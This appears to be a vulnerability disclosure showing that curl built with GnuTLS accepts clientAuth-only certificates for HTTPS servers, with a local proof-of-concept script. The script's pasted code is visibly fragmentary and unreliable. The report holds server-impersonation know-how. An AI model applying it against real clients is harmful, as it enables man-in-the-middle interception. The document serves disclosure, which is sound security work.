## Vulnerability Details

## Summary:
When curl/libcurl is built with the GnuTLS backend, the current HTTPS server-certificate validation path verifies the trust chain and hostname but does not enforce TLS server Extended Key Usage semantics. As a result, a leaf certificate that chains to a trusted CA, matches the requested hostname, and explicitly allows only `clientAuth` can still be accepted as an HTTPS server certificate. This lets an attacker who has a wrong-purpose but trusted certificate and private key impersonate an HTTPS server to affected clients, even though a correct client should reject that certificate for server authentication. The issue is not a caller-misuse or invalid-input crash: it is a runtime authentication gap in curl's GnuTLS integration. The inline PoC below self-builds the current source tree with GnuTLS and demonstrates that a valid `serverAuth` certificate succeeds, a `clientAuth`-only certificate incorrectly also succeeds, and a separate key-usage-only invalid control certificate is rejected.

## Source-level explanation
The current source code shows why this happens.

First, the GnuTLS backend initializes trust verification flags, but it does not
configure any TLS server EKU requirement:

```c
gnutls_certificate_set_verify_flags(creds,
                                    GNUTLS_VERIFY_ALLOW_X509_V1_CA_CRT);
```

Then `gtls_verify_cert()` in `lib/vtls/gtls.c` makes the trust decision from
`gnutls_certificate_verify_peers2()` and treats "not marked invalid" as a
successful certificate verification:

```c
int rc = gnutls_certificate_verify_peers2(session, &verify_status);
...
verified = !(verify_status & GNUTLS_CERT_INVALID);
if(verified)
  infof(data, "  SSL certificate verified by GnuTLS");
```

Later, `Curl_gtls_verifyserver()` imports the leaf certificate and performs a
separate hostname check:

```c
rc = (int)gnutls_x509_crt_check_hostname(x509_cert,
                                         peer->sni ? peer->sni :
                                         peer->dest->hostname);
result = (!rc && config->verifyhost) ?
  CURLE_PEER_FAILED_VERIFICATION : CURLE_OK;
```

That means the current curl validation flow is effectively:

1. trust chain check
2. time validity check
3. hostname check

What is missing is the server-purpose check on the end-entity certificate.
There is no equivalent of:

```c
gnutls_x509_crt_check_key_purpose(x509_cert,
                                  GNUTLS_KP_TLS_WWW_SERVER, 0);
```

or a switch to the GnuTLS verification API that enforces end-certificate
purpose.

So if the attacker presents a certificate that:

- chains to a trusted CA
- matches the requested hostname
- has an EKU extension that contains only `clientAuth`

the current curl code still reaches the "verified" path because it never adds
the missing "must be valid for TLS WWW server authentication" decision step.

## Steps To Reproduce:
From the repository root, run the following self-contained script. It does not depend on any local PoC file. It exports a clean tracked-source snapshot with `git archive`, downloads GnuTLS development packages into a temporary user-local SDK, builds the current source tree with the GnuTLS backend only, generates a local CA plus three test leaf certificates, starts real TLS servers, and then uses a tiny current-source libcurl probe with certificate verification enabled to connect to each case.

```bash
set -euo pipefail

REPO_ROOT="$PWD"
if [ ! -d "$REPO_ROOT/.git" ]; then
  echo "run this from the curl git repository root" >&2
  exit 1
fi

for cmd in apt-get awk cc cmake dpkg-deb getconf git ldconfig openssl sed ss tar; do
  command -v "$cmd" >/dev/null 2>&1 || {
    echo "missing required command: $cmd" >&2
    exit 1

find_so() {
  local soname="$1"
  local path
  path="$(
    ldconfig -p | awk -v so="$soname" '
      $1 == so && $0 ~ /x86-64/ { print $NF; found=1; exit }
      $1 == so && !fallback { fallback=$NF }
      END {
        if(!found && fallback)
          print fallback
      }'
  )"
  [ -n "$path" ] || {
    echo "unable to locate shared library: $soname" >&2
    exit 1
  }
  printf '%s\n' "$path"
}

port_free() {
  ! ss -ltn "( sport = :$1 )" | grep -q LISTEN
}

pick_port_base() {
  local base
  for base in 29443 29446 29449 29452 29455; do
    if port_free "$base" && port_free "$((base + 1))" && port_free "$((base + 2))"; then
      printf '%s\n' "$base"
      return
    fi
  done
  echo "unable to find three consecutive free TCP ports" >&2
  exit 1
}

BADEKU_PORT="$((PORT_BASE + 1))"

echo "[*] repo: $REPO_ROOT"
echo "[*] commit: $(git -C "$REPO_ROOT" rev-parse HEAD)"
echo "[*] workdir: $WORKDIR"
echo "[*] ports: good=$GOOD_PORT badeku=$BADEKU_PORT badku=$BADKU_PORT"

#include <stdio.h>
#include <curl/curl.h>

static size_t sink(char *ptr, size_t size, size_t nmemb, void *userdata)
{
  (void)ptr;
  (void)userdata;
  return size * nmemb;
}

int main(int argc, char **argv)
{
  CURL *h;
  CURLcode rc;

  if(argc != 3) {
    fprintf(stderr, "usage: %s <url> <cacert>\n", argv[0]);
    return 2;
  }

  printf("version=%s\n", curl_version());

  rc = curl_global_init(CURL_GLOBAL_DEFAULT);
  if(rc) {
    fprintf(stderr, "curl_global_init=%d\n", (int)rc);
    return 3;

    fprintf(stderr, "curl_easy_init failed\n");

  curl_easy_setopt(h, CURLOPT_CAINFO, argv[2]);

  curl_global_cleanup();
  return (int)rc;
}

gen_leaf() {
  local name="$1"
  openssl req -newkey rsa:2048 -nodes \
    -keyout "$CERT_ROOT/$name.key" \
    -out "$CERT_ROOT/$name.csr" \
    -config "$CERT_ROOT/$name.cnf" >/dev/null 2>&1

    -in "$CERT_ROOT/$name.csr" \
    -CA "$CERT_ROOT/ca.crt" \
    -CAkey "$CERT_ROOT/ca.key" \
    -CAcreateserial \
    -days 365 \
    -out "$CERT_ROOT/$name.crt" \
    -extfile "$CERT_ROOT/$name.cnf" \
    -extensions v3_req >/dev/null 2>&1

  echo "[+] VULNERABLE: current-source libcurl built with GnuTLS accepted a clientAuth-only server certificate."
  echo "[+] Scope note: the KU-only invalid control certificate was rejected, so this reproduces an EKU bypass."

```

Expected secure behavior:

- `good` should succeed
- `badeku` should fail because a certificate whose EKU is only `clientAuth`
  must not be accepted for HTTPS server authentication
- `badku` should fail as an invalid control case

Observed vulnerable behavior on current `HEAD`:

- `good` succeeds with `curl_easy_perform=0`
- `badeku` also succeeds with `curl_easy_perform=0`
- `badku` fails with `curl_easy_perform=35`
- the probe logs `SSL certificate verified by GnuTLS` in the vulnerable
  `badeku` case

Relevant code path in the current tree:

- `lib/vtls/gtls.c`: `gtls_verify_cert()` relies on
  `gnutls_certificate_verify_peers2()`
- `lib/vtls/gtls.c`: hostname verification is then done separately with
  `gnutls_x509_crt_check_hostname()`
- no equivalent TLS server purpose enforcement is performed on the leaf
  certificate before the connection is accepted

Why this is not just “the attacker already has a certificate, so who cares”:

- the attacker does not need a proper HTTPS server certificate
- the attacker only needs a trusted certificate and key that should be limited
  to client authentication
- without this bug, a correct HTTPS client would reject that wrong-purpose
  certificate for server impersonation
- with this bug, affected curl/libcurl clients upgrade that lower-privilege
  credential into a working server-authentication credential

## Impact

## Summary:
An attacker who can obtain a hostname-matching certificate and private key that chain to a CA trusted by the victim, but whose EKU is limited to `clientAuth`, can impersonate an HTTPS server to affected curl/libcurl clients built with GnuTLS. This breaks the intended security boundary enforced by EKU: a credential that should only authenticate a client, user, or device can be repurposed as a server identity. The most realistic scenarios are internal or enterprise PKIs that issue both client and service certificates under a trusted CA, mis-issuance where a target-host certificate is created with only `clientAuth`, or compromise of a client-certificate private key that should not be usable for HTTPS server impersonation. In those cases, a man-in-the-middle or traffic-redirection attacker can present the wrong-purpose certificate during the TLS handshake and still get a successful HTTPS connection from affected curl/libcurl clients. The result is a real certificate-authentication bypass and HTTPS server impersonation against clients that believe certificate verification is fully enabled.
